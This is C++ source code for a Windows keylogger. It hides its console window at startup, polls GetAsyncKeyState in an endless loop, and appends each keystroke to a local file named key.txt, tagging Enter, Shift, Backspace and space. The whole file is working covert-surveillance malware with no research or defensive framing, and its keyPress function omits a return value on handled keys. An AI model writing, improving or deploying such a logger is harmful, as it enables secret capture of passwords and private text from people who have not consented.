#include <iostream>
#include <Windows.h>
#include <fstream>


using namespace std;

void writeLog(LPCSTR text)
{
	ofstream log;
	log.open("key.txt", fstream::app);
	log << text;
	log.close();
}

bool keyPress(int key)
{
	switch (key)
	{
	case VK_SPACE:
		writeLog(" ");
		break;
	case VK_RETURN:
		writeLog("\n *ENTER* ");
		break;
	case VK_SHIFT:
		writeLog(" *Shift* ");
		break;
	case VK_BACK:
		writeLog(" *Backspace* ");
		break;
	default: return false;
	}
}

int main()
{
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	unsigned char key; //needs to be unsigned otherwise cya cpu
	while (TRUE)
	{
		Sleep(10);
		for (key = 8; key <= 190; key++)
		{
			if (GetAsyncKeyState(key) & 0x0001)
			{
				if (keyPress(key) == FALSE)
				{
					ofstream log;
					log.open("key.txt", fstream::app);
					log << key;
					log.close();
				}
			}
		}
	}
}